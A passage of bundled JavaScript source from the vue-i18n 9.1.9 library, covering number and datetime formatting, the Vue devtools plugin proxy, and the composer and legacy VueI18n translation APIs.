      }
    } else if (isDate(arg1)) {
      if (isNaN(arg1.getTime())) {
        throw createCoreError(
          15
          /* INVALID_DATE_ARGUMENT */
        );
      }
      value = arg1;
    } else if (isNumber(arg1)) {
      value = arg1;
    } else {
      throw createCoreError(
        14
        /* INVALID_ARGUMENT */
      );
    }
    if (isString(arg2)) {
      options.key = arg2;
    } else if (isPlainObject(arg2)) {
      options = arg2;
    }
    if (isString(arg3)) {
      options.locale = arg3;
    } else if (isPlainObject(arg3)) {
      overrides = arg3;
    }
    if (isPlainObject(arg4)) {
      overrides = arg4;
    }
    return [options.key || "", value, options, overrides];
  }
  function clearDateTimeFormat(ctx, locale, format2) {
    const context = ctx;
    for (const key in format2) {
      const id = `${locale}__${key}`;
      if (!context.__datetimeFormatters.has(id)) {
        continue;
      }
      context.__datetimeFormatters.delete(id);
    }
  }
  function number(context, ...args) {
    const { numberFormats, unresolving, fallbackLocale, onWarn } = context;
    const { __numberFormatters } = context;
    if (!Availabilities.numberFormat) {
      onWarn(getWarnMessage$1(
        2
        /* CANNOT_FORMAT_NUMBER */
      ));
      return MISSING_RESOLVE_VALUE;
    }
    const [key, value, options, overrides] = parseNumberArgs(...args);
    const missingWarn = isBoolean(options.missingWarn) ? options.missingWarn : context.missingWarn;
    const fallbackWarn = isBoolean(options.fallbackWarn) ? options.fallbackWarn : context.fallbackWarn;
    const part = !!options.part;
    const locale = isString(options.locale) ? options.locale : context.locale;
    const locales = getLocaleChain(context, fallbackLocale, locale);
    if (!isString(key) || key === "") {
      return new Intl.NumberFormat(locale).format(value);
    }
    let numberFormat = {};
    let targetLocale;
    let format2 = null;
    let from = locale;
    let to = null;
    const type = "number format";
    for (let i = 0; i < locales.length; i++) {
      targetLocale = to = locales[i];
      if (locale !== targetLocale && isTranslateFallbackWarn(fallbackWarn, key)) {
        onWarn(getWarnMessage$1(3, {
          key,
          target: targetLocale
        }));
      }
      if (locale !== targetLocale) {
        const emitter = context.__v_emitter;
        if (emitter) {
          emitter.emit("fallback", {
            type,
            key,
            from,
            to,
            groupId: `${type}:${key}`
          });
        }
      }
      numberFormat = numberFormats[targetLocale] || {};
      format2 = numberFormat[key];
      if (isPlainObject(format2))
        break;
      handleMissing(context, key, targetLocale, missingWarn, type);
      from = to;
    }
    if (!isPlainObject(format2) || !isString(targetLocale)) {
      return unresolving ? NOT_REOSLVED : key;
    }
    let id = `${targetLocale}__${key}`;
    if (!isEmptyObject(overrides)) {
      id = `${id}__${JSON.stringify(overrides)}`;
    }
    let formatter = __numberFormatters.get(id);
    if (!formatter) {
      formatter = new Intl.NumberFormat(targetLocale, assign({}, format2, overrides));
      __numberFormatters.set(id, formatter);
    }
    return !part ? formatter.format(value) : formatter.formatToParts(value);
  }
  function parseNumberArgs(...args) {
    const [arg1, arg2, arg3, arg4] = args;
    let options = {};
    let overrides = {};
    if (!isNumber(arg1)) {
      throw createCoreError(
        14
        /* INVALID_ARGUMENT */
      );
    }
    const value = arg1;
    if (isString(arg2)) {
      options.key = arg2;
    } else if (isPlainObject(arg2)) {
      options = arg2;
    }
    if (isString(arg3)) {
      options.locale = arg3;
    } else if (isPlainObject(arg3)) {
      overrides = arg3;
    }
    if (isPlainObject(arg4)) {
      overrides = arg4;
    }
    return [options.key || "", value, options, overrides];
  }
  function clearNumberFormat(ctx, locale, format2) {
    const context = ctx;
    for (const key in format2) {
      const id = `${locale}__${key}`;
      if (!context.__numberFormatters.has(id)) {
        continue;
      }
      context.__numberFormatters.delete(id);
    }
  }
  function getDevtoolsGlobalHook() {
    return getTarget().__VUE_DEVTOOLS_GLOBAL_HOOK__;
  }
  function getTarget() {
    return typeof navigator !== "undefined" && typeof window !== "undefined" ? window : typeof global !== "undefined" ? global : {};
  }
  const isProxyAvailable = typeof Proxy === "function";
  const HOOK_SETUP = "devtools-plugin:setup";
  const HOOK_PLUGIN_SETTINGS_SET = "plugin:settings:set";
  class ApiProxy {
    constructor(plugin, hook) {
      this.target = null;
      this.targetQueue = [];
      this.onQueue = [];
      this.plugin = plugin;
      this.hook = hook;
      const defaultSettings = {};
      if (plugin.settings) {
        for (const id in plugin.settings) {
          const item = plugin.settings[id];
          defaultSettings[id] = item.defaultValue;
        }
      }
      const localSettingsSaveId = `__vue-devtools-plugin-settings__${plugin.id}`;
      let currentSettings = { ...defaultSettings };
      try {
        const raw = localStorage.getItem(localSettingsSaveId);
        const data = JSON.parse(raw);
        Object.assign(currentSettings, data);
      } catch (e) {
      }
      this.fallbacks = {
        getSettings() {
          return currentSettings;
        },
        setSettings(value) {
          try {
            localStorage.setItem(localSettingsSaveId, JSON.stringify(value));
          } catch (e) {
          }
          currentSettings = value;
        }
      };
      hook.on(HOOK_PLUGIN_SETTINGS_SET, (pluginId, value) => {
        if (pluginId === this.plugin.id) {
          this.fallbacks.setSettings(value);
        }
      });
      this.proxiedOn = new Proxy({}, {
        get: (_target, prop) => {
          if (this.target) {
            return this.target.on[prop];
          } else {
            return (...args) => {
              this.onQueue.push({
                method: prop,
                args
              });
            };
          }
        }
      });
      this.proxiedTarget = new Proxy({}, {
        get: (_target, prop) => {
          if (this.target) {
            return this.target[prop];
          } else if (prop === "on") {
            return this.proxiedOn;
          } else if (Object.keys(this.fallbacks).includes(prop)) {
            return (...args) => {
              this.targetQueue.push({
                method: prop,
                args,
                resolve: () => {
                }
              });
              return this.fallbacks[prop](...args);
            };
          } else {
            return (...args) => {
              return new Promise((resolve) => {
                this.targetQueue.push({
                  method: prop,
                  args,
                  resolve
                });
              });
            };
          }
        }
      });
    }
    async setRealTarget(target) {
      this.target = target;
      for (const item of this.onQueue) {
        this.target.on[item.method](...item.args);
      }
      for (const item of this.targetQueue) {
        item.resolve(await this.target[item.method](...item.args));
      }
    }
  }
  function setupDevtoolsPlugin(pluginDescriptor, setupFn) {
    const target = getTarget();
    const hook = getDevtoolsGlobalHook();
    const enableProxy = isProxyAvailable && pluginDescriptor.enableEarlyProxy;
    if (hook && (target.__VUE_DEVTOOLS_PLUGIN_API_AVAILABLE__ || !enableProxy)) {
      hook.emit(HOOK_SETUP, pluginDescriptor, setupFn);
    } else {
      const proxy = enableProxy ? new ApiProxy(pluginDescriptor, hook) : null;
      const list = target.__VUE_DEVTOOLS_PLUGINS__ = target.__VUE_DEVTOOLS_PLUGINS__ || [];
      list.push({
        pluginDescriptor,
        setupFn,
        proxy
      });
      if (proxy)
        setupFn(proxy.proxiedTarget);
    }
  }
  /*!
    * @intlify/vue-devtools v9.1.9
    * (c) 2021 kazuya kawaguchi
    * Released under the MIT License.
    */
  const VueDevToolsLabels = {
    [
      "vue-devtools-plugin-vue-i18n"
      /* PLUGIN */
    ]: "Vue I18n devtools",
    [
      "vue-i18n-resource-inspector"
      /* CUSTOM_INSPECTOR */
    ]: "I18n Resources",
    [
      "vue-i18n-timeline"
      /* TIMELINE */
    ]: "Vue I18n"
  };
  const VueDevToolsPlaceholders = {
    [
      "vue-i18n-resource-inspector"
      /* CUSTOM_INSPECTOR */
    ]: "Search for scopes ..."
  };
  const VueDevToolsTimelineColors = {
    [
      "vue-i18n-timeline"
      /* TIMELINE */
    ]: 16764185
  };
  /*!
    * vue-i18n v9.1.9
    * (c) 2022 kazuya kawaguchi
    * Released under the MIT License.
    */
  const VERSION = "9.1.9";
  function initFeatureFlags() {
    let needWarn = false;
    {
      needWarn = true;
    }
    if (needWarn) {
      console.warn(`You are running the esm-bundler build of vue-i18n. It is recommended to configure your bundler to explicitly replace feature flag globals with boolean literals to get proper tree-shaking in the final bundle.`);
    }
  }
  const warnMessages = {
    [
      6
      /* FALLBACK_TO_ROOT */
    ]: `Fall back to {type} '{key}' with root locale.`,
    [
      7
      /* NOT_SUPPORTED_PRESERVE */
    ]: `Not supported 'preserve'.`,
    [
      8
      /* NOT_SUPPORTED_FORMATTER */
    ]: `Not supported 'formatter'.`,
    [
      9
      /* NOT_SUPPORTED_PRESERVE_DIRECTIVE */
    ]: `Not supported 'preserveDirectiveContent'.`,
    [
      10
      /* NOT_SUPPORTED_GET_CHOICE_INDEX */
    ]: `Not supported 'getChoiceIndex'.`,
    [
      11
      /* COMPONENT_NAME_LEGACY_COMPATIBLE */
    ]: `Component name legacy compatible: '{name}' -> 'i18n'`,
    [
      12
      /* NOT_FOUND_PARENT_SCOPE */
    ]: `Not found parent scope. use the global scope.`
  };
  function getWarnMessage(code, ...args) {
    return format(warnMessages[code], ...args);
  }
  function createI18nError(code, ...args) {
    return createCompileError(code, null, { messages: errorMessages, args });
  }
  const errorMessages = {
    [
      14
      /* UNEXPECTED_RETURN_TYPE */
    ]: "Unexpected return type in composer",
    [
      15
      /* INVALID_ARGUMENT */
    ]: "Invalid argument",
    [
      16
      /* MUST_BE_CALL_SETUP_TOP */
    ]: "Must be called at the top of a `setup` function",
    [
      17
      /* NOT_INSLALLED */
    ]: "Need to install with `app.use` function",
    [
      22
      /* UNEXPECTED_ERROR */
    ]: "Unexpected error",
    [
      18
      /* NOT_AVAILABLE_IN_LEGACY_MODE */
    ]: "Not available in legacy mode",
    [
      19
      /* REQUIRED_VALUE */
    ]: `Required in value: {0}`,
    [
      20
      /* INVALID_VALUE */
    ]: `Invalid value`,
    [
      21
      /* CANNOT_SETUP_VUE_DEVTOOLS_PLUGIN */
    ]: `Cannot setup vue-devtools plugin`
  };
  const DEVTOOLS_META = "__INTLIFY_META__";
  const TransrateVNodeSymbol = makeSymbol("__transrateVNode");
  const DatetimePartsSymbol = makeSymbol("__datetimeParts");
  const NumberPartsSymbol = makeSymbol("__numberParts");
  const EnableEmitter = makeSymbol("__enableEmitter");
  const DisableEmitter = makeSymbol("__disableEmitter");
  const SetPluralRulesSymbol = makeSymbol("__setPluralRules");
  const InejctWithOption = makeSymbol("__injectWithOption");
  let composerID = 0;
  function defineCoreMissingHandler(missing) {
    return (ctx, locale, key, type) => {
      return missing(locale, key, vue.getCurrentInstance() || void 0, type);
    };
  }
  function getLocaleMessages(locale, options) {
    const { messages: messages2, __i18n } = options;
    const ret = isPlainObject(messages2) ? messages2 : isArray(__i18n) ? {} : { [locale]: {} };
    if (isArray(__i18n)) {
      __i18n.forEach(({ locale: locale2, resource }) => {
        if (locale2) {
          ret[locale2] = ret[locale2] || {};
          deepCopy(resource, ret[locale2]);
        } else {
          deepCopy(resource, ret);
        }
      });
    }
    if (options.flatJson) {
      for (const key in ret) {
        if (hasOwn$1(ret, key)) {
          handleFlatJson(ret[key]);
        }
      }
    }
    return ret;
  }
  const isNotObjectOrIsArray = (val) => !isObject$1(val) || isArray(val);
  function deepCopy(src, des) {
    if (isNotObjectOrIsArray(src) || isNotObjectOrIsArray(des)) {
      throw createI18nError(
        20
        /* INVALID_VALUE */
      );
    }
    for (const key in src) {
      if (hasOwn$1(src, key)) {
        if (isNotObjectOrIsArray(src[key]) || isNotObjectOrIsArray(des[key])) {
          des[key] = src[key];
        } else {
          deepCopy(src[key], des[key]);
        }
      }
    }
  }
  const getMetaInfo = () => {
    const instance = vue.getCurrentInstance();
    return instance && instance.type[DEVTOOLS_META] ? { [DEVTOOLS_META]: instance.type[DEVTOOLS_META] } : null;
  };
  function createComposer(options = {}) {
    const { __root } = options;
    const _isGlobal = __root === void 0;
    let _inheritLocale = isBoolean(options.inheritLocale) ? options.inheritLocale : true;
    const _locale = vue.ref(
      // prettier-ignore
      __root && _inheritLocale ? __root.locale.value : isString(options.locale) ? options.locale : "en-US"
    );
    const _fallbackLocale = vue.ref(
      // prettier-ignore
      __root && _inheritLocale ? __root.fallbackLocale.value : isString(options.fallbackLocale) || isArray(options.fallbackLocale) || isPlainObject(options.fallbackLocale) || options.fallbackLocale === false ? options.fallbackLocale : _locale.value
    );
    const _messages = vue.ref(getLocaleMessages(_locale.value, options));
    const _datetimeFormats = vue.ref(isPlainObject(options.datetimeFormats) ? options.datetimeFormats : { [_locale.value]: {} });
    const _numberFormats = vue.ref(isPlainObject(options.numberFormats) ? options.numberFormats : { [_locale.value]: {} });
    let _missingWarn = __root ? __root.missingWarn : isBoolean(options.missingWarn) || isRegExp(options.missingWarn) ? options.missingWarn : true;
    let _fallbackWarn = __root ? __root.fallbackWarn : isBoolean(options.fallbackWarn) || isRegExp(options.fallbackWarn) ? options.fallbackWarn : true;
    let _fallbackRoot = __root ? __root.fallbackRoot : isBoolean(options.fallbackRoot) ? options.fallbackRoot : true;
    let _fallbackFormat = !!options.fallbackFormat;
    let _missing = isFunction(options.missing) ? options.missing : null;
    let _runtimeMissing = isFunction(options.missing) ? defineCoreMissingHandler(options.missing) : null;
    let _postTranslation = isFunction(options.postTranslation) ? options.postTranslation : null;
    let _warnHtmlMessage = isBoolean(options.warnHtmlMessage) ? options.warnHtmlMessage : true;
    let _escapeParameter = !!options.escapeParameter;
    const _modifiers = __root ? __root.modifiers : isPlainObject(options.modifiers) ? options.modifiers : {};
    let _pluralRules = options.pluralRules || __root && __root.pluralRules;
    let _context;
    function getCoreContext() {
      return createCoreContext({
        version: VERSION,
        locale: _locale.value,
        fallbackLocale: _fallbackLocale.value,
        messages: _messages.value,
        messageCompiler: function compileToFunction(source) {
          return (ctx) => {
            return ctx.normalize([source]);
          };
        },
        datetimeFormats: _datetimeFormats.value,
        numberFormats: _numberFormats.value,
        modifiers: _modifiers,
        pluralRules: _pluralRules,
        missing: _runtimeMissing === null ? void 0 : _runtimeMissing,
        missingWarn: _missingWarn,
        fallbackWarn: _fallbackWarn,
        fallbackFormat: _fallbackFormat,
        unresolving: true,
        postTranslation: _postTranslation === null ? void 0 : _postTranslation,
        warnHtmlMessage: _warnHtmlMessage,
        escapeParameter: _escapeParameter,
        __datetimeFormatters: isPlainObject(_context) ? _context.__datetimeFormatters : void 0,
        __numberFormatters: isPlainObject(_context) ? _context.__numberFormatters : void 0,
        __v_emitter: isPlainObject(_context) ? _context.__v_emitter : void 0,
        __meta: { framework: "vue" }
      });
    }
    _context = getCoreContext();
    updateFallbackLocale(_context, _locale.value, _fallbackLocale.value);
    function trackReactivityValues() {
      return [
        _locale.value,
        _fallbackLocale.value,
        _messages.value,
        _datetimeFormats.value,
        _numberFormats.value
      ];
    }
    const locale = vue.computed({
      get: () => _locale.value,
      set: (val) => {
        _locale.value = val;
        _context.locale = _locale.value;
      }
    });
    const fallbackLocale = vue.computed({
      get: () => _fallbackLocale.value,
      set: (val) => {
        _fallbackLocale.value = val;
        _context.fallbackLocale = _fallbackLocale.value;
        updateFallbackLocale(_context, _locale.value, val);
      }
    });
    const messages2 = vue.computed(() => _messages.value);
    const datetimeFormats = vue.computed(() => _datetimeFormats.value);
    const numberFormats = vue.computed(() => _numberFormats.value);
    function getPostTranslationHandler() {
      return isFunction(_postTranslation) ? _postTranslation : null;
    }
    function setPostTranslationHandler(handler) {
      _postTranslation = handler;
      _context.postTranslation = handler;
    }
    function getMissingHandler() {
      return _missing;
    }
    function setMissingHandler(handler) {
      if (handler !== null) {
        _runtimeMissing = defineCoreMissingHandler(handler);
      }
      _missing = handler;
      _context.missing = _runtimeMissing;
    }
    function isResolvedTranslateMessage(type, arg) {
      return type !== "translate" || !!arg.resolvedMessage === false;
    }
    function wrapWithDeps(fn, argumentParser, warnType, fallbackSuccess, fallbackFail, successCondition) {
      trackReactivityValues();
      let ret;
      {
        try {
          setAdditionalMeta(getMetaInfo());
          ret = fn(_context);
        } finally {
          setAdditionalMeta(null);
        }
      }
      if (isNumber(ret) && ret === NOT_REOSLVED) {
        const [key, arg2] = argumentParser();
        if (__root && isString(key) && isResolvedTranslateMessage(warnType, arg2)) {
          if (_fallbackRoot && (isTranslateFallbackWarn(_fallbackWarn, key) || isTranslateMissingWarn(_missingWarn, key))) {
            warn(getWarnMessage(6, {
              key,
              type: warnType
            }));
          }
          {
            const { __v_emitter: emitter } = _context;
            if (emitter && _fallbackRoot) {
              emitter.emit("fallback", {
                type: warnType,
                key,
                to: "global",
                groupId: `${warnType}:${key}`
              });
            }
          }
        }
        return __root && _fallbackRoot ? fallbackSuccess(__root) : fallbackFail(key);
      } else if (successCondition(ret)) {
        return ret;
      } else {
        throw createI18nError(
          14
          /* UNEXPECTED_RETURN_TYPE */
        );
      }
    }
    function t(...args) {
      return wrapWithDeps((context) => translate(context, ...args), () => parseTranslateArgs(...args), "translate", (root) => root.t(...args), (key) => key, (val) => isString(val));
    }
    function rt(...args) {
      const [arg1, arg2, arg3] = args;
      if (arg3 && !isObject$1(arg3)) {
        throw createI18nError(
          15
          /* INVALID_ARGUMENT */
        );
      }
      return t(...[arg1, arg2, assign({ resolvedMessage: true }, arg3 || {})]);
    }
    function d(...args) {
      return wrapWithDeps((context) => datetime(context, ...args), () => parseDateTimeArgs(...args), "datetime format", (root) => root.d(...args), () => MISSING_RESOLVE_VALUE, (val) => isString(val));
    }
    function n(...args) {
      return wrapWithDeps((context) => number(context, ...args), () => parseNumberArgs(...args), "number format", (root) => root.n(...args), () => MISSING_RESOLVE_VALUE, (val) => isString(val));
    }
    function normalize(values) {
      return values.map((val) => isString(val) ? vue.createVNode(vue.Text, null, val, 0) : val);
    }
    const interpolate = (val) => val;
    const processor = {
      normalize,
      interpolate,
      type: "vnode"
    };
    function transrateVNode(...args) {
      return wrapWithDeps(
        (context) => {
          let ret;
          const _context2 = context;
          try {
            _context2.processor = processor;
            ret = translate(_context2, ...args);
          } finally {
            _context2.processor = null;
          }
          return ret;
        },
        () => parseTranslateArgs(...args),
        "translate",
        // eslint-disable-next-line @typescript-eslint/no-explicit-any
        (root) => root[TransrateVNodeSymbol](...args),
        (key) => [vue.createVNode(vue.Text, null, key, 0)],
        (val) => isArray(val)
      );
    }
    function numberParts(...args) {
      return wrapWithDeps(
        (context) => number(context, ...args),
        () => parseNumberArgs(...args),
        "number format",
        // eslint-disable-next-line @typescript-eslint/no-explicit-any
        (root) => root[NumberPartsSymbol](...args),
        () => [],
        (val) => isString(val) || isArray(val)
      );
    }
    function datetimeParts(...args) {
      return wrapWithDeps(
        (context) => datetime(context, ...args),
        () => parseDateTimeArgs(...args),
        "datetime format",
        // eslint-disable-next-line @typescript-eslint/no-explicit-any
        (root) => root[DatetimePartsSymbol](...args),
        () => [],
        (val) => isString(val) || isArray(val)
      );
    }
    function setPluralRules(rules) {
      _pluralRules = rules;
      _context.pluralRules = _pluralRules;
    }
    function te(key, locale2) {
      const targetLocale = isString(locale2) ? locale2 : _locale.value;
      const message = getLocaleMessage(targetLocale);
      return resolveValue(message, key) !== null;
    }
    function resolveMessages(key) {
      let messages22 = null;
      const locales = getLocaleChain(_context, _fallbackLocale.value, _locale.value);
      for (let i = 0; i < locales.length; i++) {
        const targetLocaleMessages = _messages.value[locales[i]] || {};
        const messageValue = resolveValue(targetLocaleMessages, key);
        if (messageValue != null) {
          messages22 = messageValue;
          break;
        }
      }
      return messages22;
    }
    function tm(key) {
      const messages22 = resolveMessages(key);
      return messages22 != null ? messages22 : __root ? __root.tm(key) || {} : {};
    }
    function getLocaleMessage(locale2) {
      return _messages.value[locale2] || {};
    }
    function setLocaleMessage(locale2, message) {
      _messages.value[locale2] = message;
      _context.messages = _messages.value;
    }
    function mergeLocaleMessage(locale2, message) {
      _messages.value[locale2] = _messages.value[locale2] || {};
      deepCopy(message, _messages.value[locale2]);
      _context.messages = _messages.value;
    }
    function getDateTimeFormat(locale2) {
      return _datetimeFormats.value[locale2] || {};
    }
    function setDateTimeFormat(locale2, format2) {
      _datetimeFormats.value[locale2] = format2;
      _context.datetimeFormats = _datetimeFormats.value;
      clearDateTimeFormat(_context, locale2, format2);
    }
    function mergeDateTimeFormat(locale2, format2) {
      _datetimeFormats.value[locale2] = assign(_datetimeFormats.value[locale2] || {}, format2);
      _context.datetimeFormats = _datetimeFormats.value;
      clearDateTimeFormat(_context, locale2, format2);
    }
    function getNumberFormat(locale2) {
      return _numberFormats.value[locale2] || {};
    }
    function setNumberFormat(locale2, format2) {
      _numberFormats.value[locale2] = format2;
      _context.numberFormats = _numberFormats.value;
      clearNumberFormat(_context, locale2, format2);
    }
    function mergeNumberFormat(locale2, format2) {
      _numberFormats.value[locale2] = assign(_numberFormats.value[locale2] || {}, format2);
      _context.numberFormats = _numberFormats.value;
      clearNumberFormat(_context, locale2, format2);
    }
    composerID++;
    if (__root) {
      vue.watch(__root.locale, (val) => {
        if (_inheritLocale) {
          _locale.value = val;
          _context.locale = val;
          updateFallbackLocale(_context, _locale.value, _fallbackLocale.value);
        }
      });
      vue.watch(__root.fallbackLocale, (val) => {
        if (_inheritLocale) {
          _fallbackLocale.value = val;
          _context.fallbackLocale = val;
          updateFallbackLocale(_context, _locale.value, _fallbackLocale.value);
        }
      });
    }
    const composer = {
      id: composerID,
      locale,
      fallbackLocale,
      get inheritLocale() {
        return _inheritLocale;
      },
      set inheritLocale(val) {
        _inheritLocale = val;
        if (val && __root) {
          _locale.value = __root.locale.value;
          _fallbackLocale.value = __root.fallbackLocale.value;
          updateFallbackLocale(_context, _locale.value, _fallbackLocale.value);
        }
      },
      get availableLocales() {
        return Object.keys(_messages.value).sort();
      },
      messages: messages2,
      datetimeFormats,
      numberFormats,
      get modifiers() {
        return _modifiers;
      },
      get pluralRules() {
        return _pluralRules || {};
      },
      get isGlobal() {
        return _isGlobal;
      },
      get missingWarn() {
        return _missingWarn;
      },
      set missingWarn(val) {
        _missingWarn = val;
        _context.missingWarn = _missingWarn;
      },
      get fallbackWarn() {
        return _fallbackWarn;
      },
      set fallbackWarn(val) {
        _fallbackWarn = val;
        _context.fallbackWarn = _fallbackWarn;
      },
      get fallbackRoot() {
        return _fallbackRoot;
      },
      set fallbackRoot(val) {
        _fallbackRoot = val;
      },
      get fallbackFormat() {
        return _fallbackFormat;
      },
      set fallbackFormat(val) {
        _fallbackFormat = val;
        _context.fallbackFormat = _fallbackFormat;
      },
      get warnHtmlMessage() {
        return _warnHtmlMessage;
      },
      set warnHtmlMessage(val) {
        _warnHtmlMessage = val;
        _context.warnHtmlMessage = val;
      },
      get escapeParameter() {
        return _escapeParameter;
      },
      set escapeParameter(val) {
        _escapeParameter = val;
        _context.escapeParameter = val;
      },
      t,
      rt,
      d,
      n,
      te,
      tm,
      getLocaleMessage,
      setLocaleMessage,
      mergeLocaleMessage,
      getDateTimeFormat,
      setDateTimeFormat,
      mergeDateTimeFormat,
      getNumberFormat,
      setNumberFormat,
      mergeNumberFormat,
      getPostTranslationHandler,
      setPostTranslationHandler,
      getMissingHandler,
      setMissingHandler,
      [TransrateVNodeSymbol]: transrateVNode,
      [NumberPartsSymbol]: numberParts,
      [DatetimePartsSymbol]: datetimeParts,
      [SetPluralRulesSymbol]: setPluralRules,
      [InejctWithOption]: options.__injectWithOption
      // eslint-disable-line @typescript-eslint/no-explicit-any
    };
    {
      composer[EnableEmitter] = (emitter) => {
        _context.__v_emitter = emitter;
      };
      composer[DisableEmitter] = () => {
        _context.__v_emitter = void 0;
      };
    }
    return composer;
  }
  function convertComposerOptions(options) {
    const locale = isString(options.locale) ? options.locale : "en-US";
    const fallbackLocale = isString(options.fallbackLocale) || isArray(options.fallbackLocale) || isPlainObject(options.fallbackLocale) || options.fallbackLocale === false ? options.fallbackLocale : locale;
    const missing = isFunction(options.missing) ? options.missing : void 0;
    const missingWarn = isBoolean(options.silentTranslationWarn) || isRegExp(options.silentTranslationWarn) ? !options.silentTranslationWarn : true;
    const fallbackWarn = isBoolean(options.silentFallbackWarn) || isRegExp(options.silentFallbackWarn) ? !options.silentFallbackWarn : true;
    const fallbackRoot = isBoolean(options.fallbackRoot) ? options.fallbackRoot : true;
    const fallbackFormat = !!options.formatFallbackMessages;
    const modifiers = isPlainObject(options.modifiers) ? options.modifiers : {};
    const pluralizationRules = options.pluralizationRules;
    const postTranslation = isFunction(options.postTranslation) ? options.postTranslation : void 0;
    const warnHtmlMessage = isString(options.warnHtmlInMessage) ? options.warnHtmlInMessage !== "off" : true;
    const escapeParameter = !!options.escapeParameterHtml;
    const inheritLocale = isBoolean(options.sync) ? options.sync : true;
    if (options.formatter) {
      warn(getWarnMessage(
        8
        /* NOT_SUPPORTED_FORMATTER */
      ));
    }
    if (options.preserveDirectiveContent) {
      warn(getWarnMessage(
        9
        /* NOT_SUPPORTED_PRESERVE_DIRECTIVE */
      ));
    }
    let messages2 = options.messages;
    if (isPlainObject(options.sharedMessages)) {
      const sharedMessages = options.sharedMessages;
      const locales = Object.keys(sharedMessages);
      messages2 = locales.reduce((messages22, locale2) => {
        const message = messages22[locale2] || (messages22[locale2] = {});
        assign(message, sharedMessages[locale2]);
        return messages22;
      }, messages2 || {});
    }
    const { __i18n, __root, __injectWithOption } = options;
    const datetimeFormats = options.datetimeFormats;
    const numberFormats = options.numberFormats;
    const flatJson = options.flatJson;
    return {
      locale,
      fallbackLocale,
      messages: messages2,
      flatJson,
      datetimeFormats,
      numberFormats,
      missing,
      missingWarn,
      fallbackWarn,
      fallbackRoot,
      fallbackFormat,
      modifiers,
      pluralRules: pluralizationRules,
      postTranslation,
      warnHtmlMessage,
      escapeParameter,
      inheritLocale,
      __i18n,
      __root,
      __injectWithOption
    };
  }
  function createVueI18n(options = {}) {
    const composer = createComposer(convertComposerOptions(options));
    const vueI18n = {
      // id
      id: composer.id,
      // locale
      get locale() {
        return composer.locale.value;
      },
      set locale(val) {
        composer.locale.value = val;
      },
      // fallbackLocale
      get fallbackLocale() {
        return composer.fallbackLocale.value;
      },
      set fallbackLocale(val) {
        composer.fallbackLocale.value = val;
      },
      // messages
      get messages() {
        return composer.messages.value;
      },
      // datetimeFormats
      get datetimeFormats() {
        return composer.datetimeFormats.value;
      },
      // numberFormats
      get numberFormats() {
        return composer.numberFormats.value;
      },
      // availableLocales
      get availableLocales() {
        return composer.availableLocales;
      },
      // formatter
      get formatter() {
        warn(getWarnMessage(
          8
          /* NOT_SUPPORTED_FORMATTER */
        ));
        return {
          interpolate() {
            return [];
          }
        };
      },
      set formatter(val) {
        warn(getWarnMessage(
          8
          /* NOT_SUPPORTED_FORMATTER */
        ));
      },
      // missing
      get missing() {
        return composer.getMissingHandler();
      },
      set missing(handler) {
        composer.setMissingHandler(handler);
      },
      // silentTranslationWarn
      get silentTranslationWarn() {
        return isBoolean(composer.missingWarn) ? !composer.missingWarn : composer.missingWarn;
      },
      set silentTranslationWarn(val) {
        composer.missingWarn = isBoolean(val) ? !val : val;
      },
      // silentFallbackWarn
      get silentFallbackWarn() {
        return isBoolean(composer.fallbackWarn) ? !composer.fallbackWarn : composer.fallbackWarn;
      },
      set silentFallbackWarn(val) {
        composer.fallbackWarn = isBoolean(val) ? !val : val;
      },
      // modifiers
      get modifiers() {
        return composer.modifiers;
      },
      // formatFallbackMessages
      get formatFallbackMessages() {
        return composer.fallbackFormat;
      },
      set formatFallbackMessages(val) {
        composer.fallbackFormat = val;
      },
      // postTranslation
      get postTranslation() {
        return composer.getPostTranslationHandler();
      },
      set postTranslation(handler) {
        composer.setPostTranslationHandler(handler);
      },
      // sync
      get sync() {
        return composer.inheritLocale;
      },
      set sync(val) {
        composer.inheritLocale = val;
      },
      // warnInHtmlMessage
      get warnHtmlInMessage() {
        return composer.warnHtmlMessage ? "warn" : "off";
      },
      set warnHtmlInMessage(val) {
        composer.warnHtmlMessage = val !== "off";
      },
      // escapeParameterHtml
      get escapeParameterHtml() {
        return composer.escapeParameter;
      },
      set escapeParameterHtml(val) {
        composer.escapeParameter = val;
      },
      // preserveDirectiveContent
      get preserveDirectiveContent() {
        warn(getWarnMessage(
          9
          /* NOT_SUPPORTED_PRESERVE_DIRECTIVE */
        ));
        return true;
      },
      set preserveDirectiveContent(val) {
        warn(getWarnMessage(
          9
          /* NOT_SUPPORTED_PRESERVE_DIRECTIVE */
        ));
      },
      // pluralizationRules
      get pluralizationRules() {
        return composer.pluralRules || {};
      },
      // for internal
      __composer: composer,
      // t
      t(...args) {
        const [arg1, arg2, arg3] = args;
        const options2 = {};
        let list = null;
        let named = null;
        if (!isString(arg1)) {
          throw createI18nError(
            15
            /* INVALID_ARGUMENT */
          );
        }
        const key = arg1;
        if (isString(arg2)) {
          options2.locale = arg2;
        } else if (isArray(arg2)) {
          list = arg2;
        } else if (isPlainObject(arg2)) {
          named = arg2;
        }
        if (isArray(arg3)) {
          list = arg3;
        } else if (isPlainObject(arg3)) {
          named = arg3;
        }
        return composer.t(key, list || named || {}, options2);
      },
      rt(...args) {
        return composer.rt(...args);
      },
      // tc
      tc(...args) {
        const [arg1, arg2, arg3] = args;
        const options2 = { plural: 1 };
        let list = null;
        let named = null;
        if (!isString(arg1)) {
          throw createI18nError(
            15
            /* INVALID_ARGUMENT */
          );
        }
        const key = arg1;
        if (isString(arg2)) {
          options2.locale = arg2;
        } else if (isNumber(arg2)) {
          options2.plural = arg2;
        } else if (isArray(arg2)) {
          list = arg2;
        } else if (isPlainObject(arg2)) {
          named = arg2;
        }
        if (isString(arg3)) {
          options2.locale = arg3;
        } else if (isArray(arg3)) {
          list = arg3;
        } else if (isPlainObject(arg3)) {
          named = arg3;
        }
        return composer.t(key, list || named || {}, options2);
      },
      // te
      te(key, locale) {
        return composer.te(key, locale);
      },
      // tm
      tm(key) {
        return composer.tm(key);
      },
      // getLocaleMessage
      getLocaleMessage(locale) {
        return composer.getLocaleMessage(locale);
      },
      // setLocaleMessage
      setLocaleMessage(locale, message) {
        composer.setLocaleMessage(locale, message);
      },
      // mergeLocaleMessage
      mergeLocaleMessage(locale, message) {
        composer.mergeLocaleMessage(locale, message);
      },
      // d
      d(...args) {
        return composer.d(...args);
      },
      // getDateTimeFormat
      getDateTimeFormat(locale) {
        return composer.getDateTimeFormat(locale);
      },
      // setDateTimeFormat
      setDateTimeFormat(locale, format2) {
        composer.setDateTimeFormat(locale, format2);
      },
      // mergeDateTimeFormat
      mergeDateTimeFormat(locale, format2) {
        composer.mergeDateTimeFormat(locale, format2);
